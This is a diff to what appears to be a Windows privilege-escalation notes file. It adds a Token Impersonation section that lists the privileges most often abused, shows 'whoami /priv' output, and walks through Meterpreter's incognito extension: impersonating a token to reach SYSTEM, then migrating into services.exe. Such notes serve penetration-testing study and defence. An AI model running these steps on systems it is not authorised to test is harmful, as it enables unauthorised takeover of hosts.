@@ -193,8 +193,99 @@ $ sc start unquotedsvc
 ```
 
 ## Token Impersonation
+This access token consists of:
+- user SIDs(security identifier)
+- group SIDs
+- privileges
 
-ToDo
+The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
+
+- SeImpersonatePrivilege
+- SeAssignPrimaryPrivilege
+- SeTcbPrivilege
+- SeBackupPrivilege
+- SeRestorePrivilege
+- SeCreateTokenPrivilege
+- SeLoadDriverPrivilege
+- SeTakeOwnershipPrivilege
+- SeDebugPrivilege
+
+```
+PS> whoami /priv
+
+PRIVILEGES INFORMATION                         
+----------------------                         
+
+Privilege Name                  Description                               State
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled  
+SeProfileSingleProcessPrivilege Profile single process                    Disabled           
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled                                        
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled                                        
+SeBackupPrivilege               Back up files and directories             Disabled                                                                                 
+SeRestorePrivilege              Restore files and directories             Disabled                                                                                 
+SeShutdownPrivilege             Shut down the system                      Disabled                                                                                 
+SeDebugPrivilege                Debug programs                            Enabled                                                                                   
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled                                                                                 
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled                                                                                  
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled                                                                                 
+SeUndockPrivilege               Remove computer from docking station      Disabled                                                                                 
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled                                                                                 
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled                                                                                  
+SeCreateGlobalPrivilege         Create global objects                     Enabled                                                                                  
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled                                                                                 
+SeTimeZonePrivilege             Change the time zone                      Disabled                                                                                 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+```
+
+```console
+meterpreter > load incognito 
+Loading extension incognito...Success.
+meterpreter > list_tokens -g
+
+Delegation Tokens Available 
+========================================
+\                   
+BUILTIN\Administrators                   
+BUILTIN\IIS_IUSRS                   
+BUILTIN\Users                   
+NT AUTHORITY\AuthenticatedUsers               
+NT AUTHORITY\NTLMAuthentication               
+NTAUTHORITY\SERVICE                  
+NT AUTHORITY\ThisOrganization               
+NT AUTHORITY\WRITE RESTRICTED
+...
+
+meterpreter > impersonate_token "BUILTIN\Administrators"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do)
+
+```console
+meterpreter > ps | grep services
+Filtering on 'services'
+
+Process List
+============
+
+ PID  PPID  Name          Arch  Session  User                 Path
+ ---  ----  ----          ----  -------  ----                 ----
+ 668  580   services.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\system32\services.exe
+
+ migrate 668
+```
+
 
 ## AlwaysInstallElevated
 
